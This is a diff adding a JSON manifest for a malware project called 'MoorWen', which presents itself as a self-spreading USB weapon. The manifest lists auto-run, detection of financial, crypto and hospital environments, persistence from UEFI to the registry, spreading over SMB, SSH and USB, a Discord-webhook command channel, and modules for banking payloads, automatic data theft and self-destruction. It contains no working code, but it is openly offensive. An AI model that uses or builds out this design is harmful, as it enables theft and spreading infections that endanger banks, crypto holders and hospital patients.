@@ -1,0 +1,33 @@
+﻿{
+    "name": "MoorWen",
+    "version": "3.0",
+    "author": "𝕍𝕠𝕤𝕤🥷",
+    "session_id": "0585f9bc8380f3137b68d2403611413392ad8bb7ce6464acd7f87456ac4740074f",
+    "description": "The ultimate USB weapon — adaptive, self-evolving, and persistent.",
+    "capabilities": {
+        "auto_run": true,
+        "multi_os": ["Windows", "Linux", "macOS"],
+        "environment_detection": ["financial", "crypto", "hospital"],
+        "persistence": ["UEFI", "kernel", "cron", "systemd", "registry"],
+        "propagation": ["SMB", "SSH", "USB"],
+        "c2": "Discord Webhook",
+        "modules": [
+            "env_detector.py",
+            "banking_payload.py",
+            "crypto_payload.py",
+            "hospital_payload.py",
+            "general_payload.py",
+            "ghostchain.py",
+            "eclipse.py",
+            "voidwatch.py",
+            "c2_connector.py",
+            "self_evolution.py",
+            "ai_decision_engine.py",
+            "network_propagation.py",
+            "persistence_daemon.py",
+            "ghost_mode.py",
+            "auto_exfil.py",
+            "self_destruct.py"
+        ]
+    }
+}
